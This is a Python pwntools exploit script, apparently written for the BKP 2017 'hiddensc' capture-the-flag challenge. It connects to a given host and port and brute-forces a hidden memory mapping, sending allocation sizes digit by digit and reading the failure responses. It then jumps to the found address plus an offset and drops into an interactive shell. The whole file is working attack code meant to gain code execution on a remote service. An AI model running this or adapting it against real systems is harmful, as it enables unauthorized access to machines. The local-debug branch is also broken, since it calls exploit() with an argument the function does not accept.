#!/usr/bin/env python

from pwn import *
import sys

def alloc(r, s, f = False):
	r.sendline('a')
	r.recvuntil('sz? ')
	r.sendline(str(s))
#	if f:
#		r.sendline(f)
#	r.recvuntil(':')

def jump(r, addr):
	r.sendline('j')
	r.recvuntil('sz? ')
	r.sendline(str(addr))

def exploit():

	# echo 0 > /proc/sys/vm/overcommit_memory
	
	r = remote(sys.argv[1], int(sys.argv[2]))
	r.recvuntil(':')

	addr = list('0x000000000000')
	
	for i in range(9):
		for x in ['f','e','d','c','b','a','9','8','7','6','5','4','3','2','1','0']:
			print "Addr: " + ''.join(addr)
			addr[i+2] = x
			alloc(r, int(''.join(addr), 16) , 'n')
			data = r.recvline(timeout=.5)
			if 'FAIL' not in data:
				r.sendline('y')
				break
	print "Addr: " + ''.join(addr)

	jump(r, int(''.join(addr), 16) + 0x11000)
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
#        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit()
    else:
        r = process(['/vagrant/bkp2017/hiddensc/hiddensc'])
        print util.proc.pidof(r)
        pause()
        exploit(r)